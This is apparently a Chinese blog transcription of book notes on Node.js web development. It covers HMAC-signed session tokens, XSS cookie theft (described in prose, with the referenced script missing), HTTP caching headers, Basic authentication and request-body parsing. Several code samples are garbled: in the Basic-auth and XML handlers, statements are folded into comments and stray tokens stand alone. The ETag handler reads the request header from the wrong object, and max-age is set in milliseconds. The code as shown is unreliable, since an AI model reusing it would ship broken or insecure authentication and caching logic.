<h3 id="Session与安全-1"><a href="#Session与安全-1" class="headerlink" title="Session与安全"></a>Session与安全</h3><p>从前文可以知道，尽管我们的数据都放置在后端了，使得它能保障安全，但是无论通过Cookie，还是查询字符串的实现方式，Session的口令依然保存在客户端，这里会存在口令被盗用的情况。如果Web应用的用户十分多，自行设计的随机算法的一些口令值就有理论机会命中有效的口令值。一旦口令被伪造，服务器端的数据也可能间接被利用。这里提到的Session的安全，就主要指如何让这个口令更加安全。有一种做法是将这个口令通过私钥加密进行签名，使得伪造的成本较高。客户端尽管可以伪造口令值，但是由于不知道私钥值，签名信息很难伪造。如此，我们只要在响应时将口令和签名进行对比，如果签名非法，我们将服务器端的数据立即过期即可，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> sign = <span class="function"><span class="keyword">function</span> (<span class="params">val, secret</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> val + <span class="string">'.'</span> + crypto.createHmac(<span class="string">'sha256'</span>, secret)</div><div class="line">    .update(val).digest(<span class="string">'base64'</span>)</div><div class="line">    .replace(<span class="regexp">/\=+$/</span>, <span class="string">''</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在响应时，设置session值到Cookie中或者跳转URL中，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> val = sign(req.sessionID,secret);</div><div class="line">res.setHeader(<span class="string">'Set-Cookie'</span>, cookie.serialize(key, val));</div></pre></td></tr></table></figure>
<p>接收请求时，检查签名，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 取出口令部分进行签名，对比用户提交的值 </span></div><div class="line"><span class="keyword">var</span> unsign = <span class="function"><span class="keyword">function</span> (<span class="params">val, secret</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> str = val.slice(<span class="number">0</span>, val.lastIndexOf(<span class="string">'.'</span>));</div><div class="line">  <span class="keyword">return</span> sign(str, secret) == val ? str : <span class="literal">false</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这样一来，即使攻击者知道口令中.号前的值是服务器端Session的ID值，只要不知道secret私钥的值，就无法伪造签名信息，以此实现对Session的保护。该方法被Connect中间件框架所使用，保护好私钥，就是在保障自己Web应用的安全。</p>
<p>当然，将口令进行签名是一个很好的解决方案，但是如果攻击者通过某种方式获取了一个真实的口令和签名，他就能实现身份的伪装。一种方案是将客户端的某些独有信息与口令作为原值，然后签名，这样攻击者一旦不在原始的客户端上进行访问，就会导致签名失败。这些独有信息包括用户IP和用户代理（User Agent）。但是原始用户与攻击者之间也存在上述信息相同的可能性，如局域网出口IP相同，相同的客户端信息等，不过纳入这些考虑能够提高安全性。通常而言，将口令存在Cookie中不容易被他人获取，但是一些别的漏洞可能导致这个口令被泄漏，典型的有XSS漏洞，下面简单介绍一下如何通过XSS拿到用户的口令，实现伪造。</p>
<p><code>XSS</code>的全称是<code>跨站脚本攻击（CrossSite Scripting，通常简称为XSS）</code></p>
<p>通常都是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS漏洞会让别的脚本执行。它的主要形成原因多数是用户的输入没有被转义，而被直接执行。</p>
<p>这段代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令。然后他在客户端中用这个口令伪造Cookie，从而实现了伪装用户的身份。如果该用户是网站管理员，就可能造成极大的危害。</p>
<p>XSS造成的危害远远不止这些，这里不再过多介绍。在这个案例中，如果口令中有用户的客户端信息的签名，即使口令被泄漏，除非攻击者与用户客户端完全相同，否则不能实现伪造。</p>
<h3 id="8-1-6-缓存-1"><a href="#8-1-6-缓存-1" class="headerlink" title="8.1.6 缓存"></a>8.1.6 缓存</h3><p>我们知道软件的架构经历过一次<code>C/S</code> 模式到<code>B/S</code>模式的演变，在HTTP之上构建的应用，其客户端除了比普通桌面应用具备更轻量的升级和部署等特性外，在跨平台、跨浏览器、跨设备上也具备独特优势。传统客户端在安装后的应用过程中仅仅需要传输数据，Web应用还需要传输构成界面的组件（HTML、JavaScript、CSS文件等）。这部分内容在大多数场景下并不经常变更，却需要在每次的应用中向客户端传递，如果不进行处理，那么它将造成不必要的带宽浪费。如果网络速度较差，就需要花费更多时间来打开页面，对于用户的体验将会造成一定影响。因此节省不必要的传输，对用户和对服务提供者来说都有好处。</p>
<p>为了提高性能，<strong>YSlow</strong>中也提到几条关于缓存的规则。添加Expires或Cache-Control到报文头中。<br>配置ETags。让Ajax可缓存。<br>这里我们将展开这几条规则的来源。如何让浏览器缓存我们的静态资源，这也是一个需要由服务器与浏览器共同协作完成的事情。</p>
<p>RFC 2616规范对此有一定的描述，只有遵循约定，整个缓存机制才能有效建立。通常来说，POST、DELETE、PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存只应用在GET请求中。使用缓存的流程如图8-1所示。</p>
<p>简单来讲，本地没有文件时，浏览器必然会请求服务器端的内容，并将这部分内容放置在本地的某个缓存目录中。在第二次请求时，它将对本地文件进行检查，如果不能确定这份本地文件是否可以直接使用，它将会发起一次条件请求。所谓条件请求，就是在普通的GET请求报文中，附带If-Modified-Since字段，如下所示：<br>If-Modified-Since: Sun, 03 Feb 2013 06:01:12 GMT它将询问服务器端是否有更新的版本，本地文件的最后修改时间。如果服务器端没有新的版本，只需响应一个304状态码，客户端就使用本地版本。如果服务器端有新的版本，就将新的内容发送给客户端，客户端放弃本地版本。代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.stat(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, stat</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> lastModified =</div><div class="line">      stat.mtime.toUTCString();</div><div class="line">    <span class="keyword">if</span> (lastModified === req.headers[<span class="string">'if-modified-since'</span>]) &#123;</div><div class="line">      res.writeHead(<span class="number">304</span>,</div><div class="line">        <span class="string">"Not Modified"</span>);</div><div class="line">      res.end();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> lastModified =</div><div class="line">          stat.mtime.toUTCString();</div><div class="line">        res.setHeader(<span class="string">"Last-Modified"</span>, lastModified);</div><div class="line">        res.writeHead(<span class="number">200</span>,</div><div class="line">          <span class="string">"Ok"</span>);</div><div class="line">        res.end(file);</div><div class="line">      &#125;);</div><div class="line">    &#125;</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这里的条件请求采用时间戳的方式实现，但是时间戳有一些缺陷存在。<br>文件的时间戳改动但内容并不一定改动。时间戳只能精确到秒级别，更新频繁的内容将无法生效。<br>为此HTTP1.1中引入了ETag来解决这个问题。ETag的全称是Entity Tag，由服务器端生成，服务器端可以决定它的生成规则。如果根据文件内容生成散列值，那么条件请求将不会受到时间戳改动造成的带宽浪费。下面是根据内容生成散列值的方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> getHash = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> shasum = crypto.createHash(<span class="string">'sha1'</span>);</div><div class="line">  <span class="keyword">return</span> shasum.update(str).digest(<span class="string">'base64'</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>与If-Modified-Since/Last-Modified不同的是，ETag的请求和响应是If-None-Match/ETag，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> hash = getHash(file);</div><div class="line">    <span class="keyword">var</span> noneMatch = req[<span class="string">'if-none-match'</span>];</div><div class="line">    <span class="keyword">if</span> (hash === noneMatch) &#123;</div><div class="line">      res.writeHead(<span class="number">304</span>, <span class="string">"Not Modified"</span>);</div><div class="line">      res.end();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      res.setHeader(<span class="string">"ETag"</span>, hash);</div><div class="line">      res.writeHead(<span class="number">200</span>, <span class="string">"Ok"</span>);</div><div class="line">      res.end(file);</div><div class="line">    &#125;</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>浏览器在收到<br>ETag: “83-1359871272000”</p>
<p>这样的请求后，在下次的请求中，会将其放置在请求头中：</p>
<p>If-None-Match:”83-1359871272000”。</p>
<p>尽管条件请求可以在文件内容没有修改的情况下节省带宽，但是它依然会发起一个HTTP请求，使得客户端依然会花一定时间来等待响应。可见最好的方案就是连条件请求都不用发起。那么如何让浏览器知晓是否能直接使用本地版本呢？答案就是服务器端在响应内容时，让浏览器明确地将内容缓存起来。如同YSlow规则里提到的，在响应里设置Expires或Cache-Control头，浏览器将根据该值进行缓存。那么这两个值有何区别呢？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> expires = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line">    expires.setTime(expires.getTime() + <span class="number">10</span> * <span class="number">365</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>);</div><div class="line">    res.setHeader(<span class="string">"Expires"</span>, expires.toUTCString());</div><div class="line">    res.writeHead(<span class="number">200</span>, <span class="string">"Ok"</span>);</div><div class="line">    res.end(file);</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>Expires是一个GMT格式的时间字符串。浏览器在接到这个过期值后，只要本地还存在这个缓存文件，在到期时间之前它都不会再发起请求。YUI3的CDN实践是缓存文件在10年后过期。但是Expires的缺陷在于浏览器与服务器之间的时间可能不一致，这可能会带来一些问题，比如文件提前过期，或者到期后并没有被删除。</p>
<p>Cache-Control以更丰富的形式，实现相同的功能，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">    res.setHeader(<span class="string">"Cache-Control"</span>,</div><div class="line">      <span class="string">"max-age="</span> + <span class="number">10</span> * <span class="number">365</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>);</div><div class="line">    res.writeHead(<span class="number">200</span>, <span class="string">"Ok"</span>);</div><div class="line">    res.end(file);</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>上面的代码为Cache-Control设置了max-age值，它比Expires优秀的地方在于，Cache-Control能够避免浏览器端与服务器端时间不同步带来的不一致性问题，只要进行类似倒计时的方式计算过期时间即可。除此之外，Cache-Control的值还能设置public、private、no-cache、no-store等能够更精细地控制缓存的选项。<br>由于在HTTP1.0时还不支持max-age，如今的服务器端在模块的支持下多半同时对Expires和Cache-Control进行支持。在浏览器中如果两个值同时存在，且被同时支持时，max-age会覆盖Expires。</p>
<h3 id="清除缓存-1"><a href="#清除缓存-1" class="headerlink" title="清除缓存"></a>清除缓存</h3><p>虽然我们知晓了如何设置缓存，以达到节省网络带宽的目的，但是缓存一旦设定，当服务器端意外更新内容时，却无法通知客户端更新。这使得我们在使用缓存时也要为其设定版本号，所幸浏览器是根据URL进行缓存，那么一旦内容有所更新时，我们就让浏览器发起新的URL请求，使得新内容能够被客户端更新。一般的更新机制有如下两种。每次发布，路径中跟随Web应用的版本号：<code>http://url.com/?v=20130501</code> .<br>每次发布，路径中跟随该文件内容的hash值：<code>http://url.com/?hash=afadfadwe</code> 。大体来说，根据文件内容的hash值进行缓存淘汰会更加高效，因为文件内容不一定随着Web应用的版本而更新，而内容没有更新时，版本号的改动导致的更新毫无意义，因此以文件内容形成的hash值更精准。</p>
<h3 id="8-1-7-Basic认证-1"><a href="#8-1-7-Basic认证-1" class="headerlink" title="8.1.7 Basic认证"></a>8.1.7 Basic认证</h3><h3 id="Basic认证-1"><a href="#Basic认证-1" class="headerlink" title="Basic认证"></a>Basic认证</h3><p>Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式。这里简要介绍它的原理和它在服务器端通过Node处理的流程。</p>
<p>如果一个页面需要Basic认证，它会检查请求报文头中的Authorization字段的内容，该字段的值由认证方式和加密值构成，如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ curl -v &quot;http://user:pass@www.baidu.com/&quot;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">Authorization: Basic dXNlcjpwYXNz </div><div class="line">User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5</div><div class="line">Host: www.baidu.com </div><div class="line">Accept: */*</div></pre></td></tr></table></figure>
<p>在Basic认证中，它会将用户和密码部分组合： <code>username\+ &quot;:&quot; + password</code>。然后进行Base64编码，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> encode = <span class="function"><span class="keyword">function</span> (<span class="params">username, password</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Buffer(username + <span class="string">':'</span> + password).toString(<span class="string">'base64'</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>如果用户首次访问该网页，URL地址中也没携带认证内容，那么浏览器会响应一个401未授权的状态码，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> auth = req.headers[<span class="string">'authorization'</span>] || <span class="string">''</span>;</div><div class="line">  <span class="keyword">var</span> parts = auth.split(<span class="string">' '</span>);</div><div class="line">  <span class="keyword">var</span> method = parts[<span class="number">0</span>] || <span class="string">''</span>; <span class="comment">// Basic var encoded = parts[1] || ''; //</span></div><div class="line">  dXNlcjpwYXNz</div><div class="line">  <span class="keyword">var</span> decoded = <span class="keyword">new</span> Buffer(encoded,</div><div class="line">    <span class="string">'base64'</span>).toString(<span class="string">'utf-8'</span>).split(<span class="string">":"</span>);</div><div class="line">  <span class="keyword">var</span> user = decoded[<span class="number">0</span>]; <span class="comment">//</span></div><div class="line">  user</div><div class="line">  <span class="keyword">var</span> pass = decoded[<span class="number">1</span>]; <span class="comment">// pass if (!checkUser(user, pass)) &#123;</span></div><div class="line">  res.setHeader(<span class="string">'WWW-Authenticate'</span>, <span class="string">'Basic realm="Secure Area"'</span>);</div><div class="line">  res.writeHead(<span class="number">401</span>);</div><div class="line">  res.end();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  handle(req, res);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上面的代码中，响应头中的<code>WWW-Authenticate</code> 字段告知浏览器采用什么样的认证和加密方式。一般而言，未认证的情况下，浏览器会弹出对话框进行交互式提交认证信息，如图8-2所示。<br>图8-2　浏览器弹出的交互式提交认证信息的对话框当认证通过，服务器端响应200状态码之后，浏览器会保存用户名和密码口令，在后续的请求中都携带上Authorization信息。<br>Basic认证有太多的缺点，它虽然经过Base64加密后在网络中传送，但是这近乎于明文，十分危险，一般只有在HTTPS的情况下才会使用。不过Basic认证的支持范围十分广泛，几乎所有的浏览器都支持它。为了改进Basic认证，RFC 2069规范提出了摘要访问认证，它加入了服务器端随机数来保护认证过程，在此不做深入的解释。</p>
<h3 id="8-2-数据上传-1"><a href="#8-2-数据上传-1" class="headerlink" title="8.2 数据上传"></a>8.2 数据上传</h3><h3 id="数据上传-1"><a href="#数据上传-1" class="headerlink" title="数据上传"></a>数据上传</h3><p>上述的内容基本都集中在HTTP请求报文头中，适用于GET请求和大多数其他请求。头部报文中的内容已经能够让服务器端进行大多数业务逻辑操作了，但是单纯的头部报文无法携带大量的数据，在业务中，我们往往需要接收一些数据，比如表单提交、文件提交、JSON上传、XML上传等。</p>
<p>Node的http模块只对HTTP报文的头部进行了解析，然后触发request事件。如果请求中还带有内容部分（如POST请求，它具有报头和内容），内容部分需要用户自行接收和解析。通过报头的Transfer-Encoding或Content-Length即可判断请求中是否带有内容，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> hasBody = <span class="function"><span class="keyword">function</span> (<span class="params">req</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="string">'transfer-encoding'</span> <span class="keyword">in</span> req.headers || <span class="string">'content-length'</span> <span class="keyword">in</span> req.headers;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发，我们只需以流的方式处理即可，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (hasBody(req)) &#123;</div><div class="line">    <span class="keyword">var</span> buffers = [];</div><div class="line">    req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">      buffers.push(chunk);</div><div class="line">    &#125;);</div><div class="line">    req.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">      req.rawBody = Buffer.concat(buffers).toString();</div><div class="line">      handle(req, res);</div><div class="line">    &#125;);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将接收到的Buffer列表转化为一个Buffer对象后，再转换为没有乱码的字符串，暂时挂置在req.rawBody处。</p>
<h3 id="8-2-1-表单数据-1"><a href="#8-2-1-表单数据-1" class="headerlink" title="8.2.1 表单数据"></a>8.2.1 表单数据</h3><h3 id="表单数据-1"><a href="#表单数据-1" class="headerlink" title="表单数据"></a>表单数据</h3><p>最为常见的数据提交就是通过网页表单提交数据到服务器端，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;form action=&quot;/upload&quot; method=&quot;post&quot;&gt;</div><div class="line">  &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; /&gt;</div><div class="line">  &lt;br /&gt;</div><div class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
<p>默认的表单提交，请求头中的<code>Content-Type</code> 字段值为<code>application/x-www-form-urlencoded</code> ，</p>
<p>如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Content-Type: application/x-www-form-urlencoded</div></pre></td></tr></table></figure>
<p>由于它的报文体内容跟查询字符串相同：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">foo=bar&amp;baz=val</div></pre></td></tr></table></figure>
<p>因此解析它十分容易：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (req.headers[<span class="string">'content-type'</span>] === <span class="string">'application/x-www-form-urlencoded'</span>) &#123;</div><div class="line">    req.body = querystring.parse(req.rawBody);</div><div class="line">  &#125;</div><div class="line">  todo(req, res);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>后续业务中直接访问<code>req.body</code>就可以得到表单中提交的数据。</p>
<h3 id="8-2-2-其他格式-1"><a href="#8-2-2-其他格式-1" class="headerlink" title="8.2.2 其他格式"></a>8.2.2 其他格式</h3><p>除了表单数据外，常见的提交还有JSON和XML文件等，判断和解析他们的原理都比较相似，都是依据Content-Type中的值决定，其中JSON类型的值为application/json，XML的值为application/xml。</p>
<p>需要注意的是，在Content-Type中可能还附带如下所示的编码信息：Content-Type: application/json; charset=utf-8</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> mime = <span class="function"><span class="keyword">function</span> (<span class="params">req</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> str = req.headers[<span class="string">'content-type'</span>] || <span class="string">''</span>; <span class="keyword">return</span> str.split(<span class="string">';'</span>)[<span class="number">0</span>];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>解析XML文件稍微复杂一点，但是社区有支持XML文件到JSON对象转换的库，这里以xml2js模块为例，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> xml2js = <span class="built_in">require</span>(<span class="string">'xml2js'</span>);</div><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (mime(req) === <span class="string">'application/xml'</span>) &#123;</div><div class="line">    xml2js.parseString(req.rawBody, <span class="function"><span class="keyword">function</span> (<span class="params">err, xml</span>) </span>&#123;</div><div class="line">      <span class="keyword">if</span> (err) &#123;</div><div class="line">        <span class="comment">// 异常内容，响应Bad request res.writeHead(400);</span></div><div class="line">        res.end(<span class="string">'Invalid XML'</span>);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">      &#125;</div><div class="line">      req.body = xml;</div><div class="line">      todo(req, res);</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="8-2-3-附件上传-1"><a href="#8-2-3-附件上传-1" class="headerlink" title="8.2.3 附件上传"></a>8.2.3 附件上传</h3><p>附件上传<br>除了常见的表单和特殊格式的内容提交外，还有一种比较独特的表单。通常的表单，其内容可以通过urlencoded的方式编码内容形成报文体，再发送给服务器端，但是业务场景往往需要用户直接提交文件。在前端HTML代码中，特殊表单与普通表单的差异在于该表单中可以含有file类型的控件，以及需要指定表单属性enctype为multipart/form-data，如下所示：<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/upload"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"username"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>浏览器在遇到multipart/form-data表单提交时，构造的请求报文与普通表单完全不同。首先它的报头中最为特殊的如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Content-Type: multipart/form-data; </div><div class="line">boundary=AaB03x </div><div class="line">Content-Length: 18231</div></pre></td></tr></table></figure>
<p>它代表本次提交的内容是由多部分构成的，其中<code>boundary=AaB03x</code>指定的是每部分内容的分界符，AaB03x是随机生成的一段字符串，报文体的内容将通过在它前面添加–进行分割，报文结束时在它前后都加上–表示结束。另外，Content-Length的值必须确保是报文体的长度。假设上面的表单选择了一个名为diveintonode.js的文件，并进行提交上传，那么生成的报文如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--AaB03x\r\n </div><div class="line">Content-Disposition: form-data; </div><div class="line">name=&quot;username&quot;\r\n</div><div class="line">\r\n Jackson Tian\r\n</div><div class="line">--AaB03x\r\n </div><div class="line">Content-Disposition: form-data; </div><div class="line">name=&quot;file&quot;;</div><div class="line">filename=&quot;diveintonode.js&quot;\r\n</div><div class="line">Content-Type: application/javascript\r\n \r\n</div><div class="line">... contents of diveintonode.js ... </div><div class="line">--AaB03x--</div></pre></td></tr></table></figure>
<p>普通的表单控件的报文体如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--AaB03x\r\n</div><div class="line">Content-Disposition: form-data; name=&quot;username&quot;\r\n \r\n</div><div class="line">Jackson Tian\r\n</div></pre></td></tr></table></figure>
<p>文件控件形成的报文如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--AaB03x\r\n </div><div class="line">Content-Disposition: form-data; </div><div class="line">name=&quot;file&quot;;</div><div class="line">filename=&quot;diveintonode.js&quot;\r\n</div><div class="line">Content-Type: application/javascript\r\n \r\n</div><div class="line">... contents of diveintonode.js ...</div></pre></td></tr></table></figure>
<p>一旦我们知晓报文是如何构成的，那么解析它就变得十分容易。值得注意的一点是，由于是文件上传，那么像普通表单、JSON或XML那样先接收内容再解析的方式将变得不可接受。接收大小未知的数据量时，我们需要十分谨慎，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (hasBody(req)) &#123;</div><div class="line">    <span class="keyword">var</span> done = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">      handle(req, res);</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">if</span> (mime(req) === <span class="string">'application/json'</span>) &#123;</div><div class="line">      parseJSON(req, done);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mime(req) === <span class="string">'application/xml'</span>) &#123;</div><div class="line">      parseXML(req, done);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mime(req) === <span class="string">'multipart/form-data'</span>) &#123;</div><div class="line">      parseMultipart(req, done);</div><div class="line">    &#125;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里我们将req这个流对象直接交给对应的解析方法，由解析方法自行处理上传的内容，或接收内容并保存在内存中，或流式处理掉</p>
<p>这里要介绍到的模块是formidable。它基于流式处理解析报文，将接收到的文件写入到系统的临时文件夹中，并返回对应的路径，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> formidable = <span class="built_in">require</span>(<span class="string">'formidable'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (hasBody(req)) &#123;</div><div class="line">    <span class="keyword">if</span> (mime(req) === <span class="string">'multipart/form-data'</span>) &#123;</div><div class="line">      <span class="keyword">var</span> form = <span class="keyword">new</span> formidable.IncomingForm();</div><div class="line">      form.parse(req, <span class="function"><span class="keyword">function</span> (<span class="params">err, fields,</span></span></div><div class="line">        files) &#123;</div><div class="line">        req.body = fields;</div><div class="line">        req.files = files;</div><div class="line">        handle(req, res);</div><div class="line">      &#125;);</div><div class="line">    &#125;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因此在业务逻辑中只要检查req.body和req.files中的内容即可。</p>
<h3 id="8-2-4-数据上传与安全-1"><a href="#8-2-4-数据上传与安全-1" class="headerlink" title="8.2.4 数据上传与安全"></a>8.2.4 数据上传与安全</h3><h3 id="数据上传与安全-1"><a href="#数据上传与安全-1" class="headerlink" title="数据上传与安全"></a>数据上传与安全</h3><p>Node提供了相对底层的API，通过它构建各种各样的Web应用都是相对容易的，但是在Web应用中，不得不重视与数据上传相关的安全问题。由于Node与前端JavaScript的近缘性，前端JavaScript甚至可以上传到服务器直接执行，但在这里我们并不讨论这样危险的动作，而是介绍内存和CSRF相关的安全问题。</p>
<ol>
<li>内存限制<br>在解析表单、JSON和XML部分，我们采取的策略是先保存用户提交的所有数据，然后再解析处理，最后才传递给业务逻辑。这种策略存在潜在的问题是，它仅仅适合数据量小的提交请求，一旦数据量过大，将发生内存被占光的情况。攻击者通过客户端能够十分容易地模拟伪造大量数据，如果攻击者每次提交1 MB的内容，那么只要并发请求数量一大，内存就会很快地被吃光。要解决这个问题主要有两个方案。</li>
</ol>
